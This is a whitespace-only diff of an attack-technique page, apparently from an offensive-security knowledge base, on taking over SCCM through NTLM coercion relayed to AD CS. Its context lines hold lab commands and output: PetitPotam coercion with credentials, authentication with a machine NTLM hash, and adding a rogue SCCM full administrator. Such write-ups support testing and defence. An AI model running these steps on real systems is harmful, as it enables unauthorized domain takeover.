@@ -29,7 +29,7 @@ Hierarchy takeover via NTLM coercion and relay to HTTP on AD CS
     - Certificate Enrollment Web Service [NON-DEFAULT]
 - Connectivity from the relay server to HTTPS (TCP/443) on the relay target hosting the AD CS service
 - Extended protection for authentication is not required by the target AD CS service [DEFAULT]
-- An enabled AD CS template that allows enrollment and supports authentication 
+- An enabled AD CS template that allows enrollment and supports authentication
 - Relay target settings:
     - `RestrictReceivingNTLMTraffic` = `0` or not present [DEFAULT]
 - Domain controller settings:
@@ -60,14 +60,14 @@ The steps to execute TAKEOVER-3.1 through TAKEOVER-3.4 are the same except that 
 1. Use `SCCMHunter` to  profile SCCM infrastructure:
 
     ```
-    [12:24:25 AM] INFO     [+] Finished profiling all discovered computers.                                   
+    [12:24:25 AM] INFO     [+] Finished profiling all discovered computers.
     [12:24:25 AM] INFO     +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                         | Hostname                | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |
                         +=========================+============+=================+==============+===================+=====================+===============+========+=========+
                         | provider.internal.lab   | None       | False           | False        | False             | False               | True          | False  | False   |
                         +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                         | sccm.internal.lab       | LAB        | False           | True         | True              | False               | True          | False  | False   |
-                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+       
+                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
     ```
 
 2. On the attacker relay server, start `ntlmrelayx`, targeting the URL of the certificate enrollment web interface on the certificate authority:
@@ -100,7 +100,7 @@ The steps to execute TAKEOVER-3.1 through TAKEOVER-3.4 are the same except that 
 
     ```
     ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
-    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP> 
+    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP>
 
     Trying pipe lsarpc
     [-] Connecting to ncacn_np:10.10.100.121[\PIPE\lsarpc]
@@ -148,36 +148,36 @@ The steps to execute TAKEOVER-3.1 through TAKEOVER-3.4 are the same except that 
 
 ```
 └─# python3 sccmhunter.py admin -u sccm\$ -p aad3b435b51404eeaad3b435b51404ee:075f745ec2daeb97c87b30d1d394f28b -ip 10.10.100.9
-    
-[06:53:08 PM] INFO     [!] Enter help for extra shell commands                                                                                               
-() C:\ >> show_admins 
-[06:53:11 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
-[06:53:11 PM] INFO     Current Full Admin Users:                                                                                                             
-[06:53:11 PM] INFO     lab\Administrator                                                                                                                     
+
+[06:53:08 PM] INFO     [!] Enter help for extra shell commands
+() C:\ >> show_admins
+[06:53:11 PM] INFO     Tasked SCCM to list current SMS Admins.
+[06:53:11 PM] INFO     Current Full Admin Users:
+[06:53:11 PM] INFO     lab\Administrator
 () (C:\) >> get_user specter
-[06:53:13 PM] INFO     [*] Collecting users...                                                                                                               
-[06:53:13 PM] INFO     [+] User found.                                                                                                                       
-[06:53:14 PM] INFO     ------------------------------------------                                                                                            
-                       DistinguishedName: CN=specter,OU=DOMUSERS,DC=internal,DC=lab                                                                          
-                       FullDomainName: INTERNAL.LAB                                                                                                          
-                       FullUserName: specter                                                                                                              
-                       Mail:                                                                                                                                 
-                       NetworkOperatingSystem: Windows NT                                                                                                    
-                       ResourceId: 2063597574                                                                                                                
-                       sid: S-1-5-21-2391214593-4168590120-2599633397-1109                                                                                   
-                       UniqueUserName: lab\specter                                                                                                           
-                       UserAccountControl: 66048                                                                                                             
-                       UserName: specter                                                                                                           
-                       UserPrincipalName: specter@internal.lab                                                                                        
-                       ------------------------------------------                                                                                            
+[06:53:13 PM] INFO     [*] Collecting users...
+[06:53:13 PM] INFO     [+] User found.
+[06:53:14 PM] INFO     ------------------------------------------
+                       DistinguishedName: CN=specter,OU=DOMUSERS,DC=internal,DC=lab
+                       FullDomainName: INTERNAL.LAB
+                       FullUserName: specter
+                       Mail:
+                       NetworkOperatingSystem: Windows NT
+                       ResourceId: 2063597574
+                       sid: S-1-5-21-2391214593-4168590120-2599633397-1109
+                       UniqueUserName: lab\specter
+                       UserAccountControl: 66048
+                       UserName: specter
+                       UserPrincipalName: specter@internal.lab
+                       ------------------------------------------
 () (C:\) >> add_admin specter S-1-5-21-2391214593-4168590120-2599633397-1109
-[06:53:19 PM] INFO     Tasked SCCM to add specter as an administrative user.                                                                                 
-[06:53:19 PM] INFO     [+] Successfully added specter as an admin.                                                                                           
-() (C:\) >> show_admins 
-[06:53:20 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
-[06:53:20 PM] INFO     Current Full Admin Users:                                                                                                             
-[06:53:20 PM] INFO     lab\Administrator                                                                                                                     
-[08:46:39 PM] INFO     specter 
+[06:53:19 PM] INFO     Tasked SCCM to add specter as an administrative user.
+[06:53:19 PM] INFO     [+] Successfully added specter as an admin.
+() (C:\) >> show_admins
+[06:53:20 PM] INFO     Tasked SCCM to list current SMS Admins.
+[06:53:20 PM] INFO     Current Full Admin Users:
+[06:53:20 PM] INFO     lab\Administrator
+[08:46:39 PM] INFO     specter
 ```
 
 ## References
